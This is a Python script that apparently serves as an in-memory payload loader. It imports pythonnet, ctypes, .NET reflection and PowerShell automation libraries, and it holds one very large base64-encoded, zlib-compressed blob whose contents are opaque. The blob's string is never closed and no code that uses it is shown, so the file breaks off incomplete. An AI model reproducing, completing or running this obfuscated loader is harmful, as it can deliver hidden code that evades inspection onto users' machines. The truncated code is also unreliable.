import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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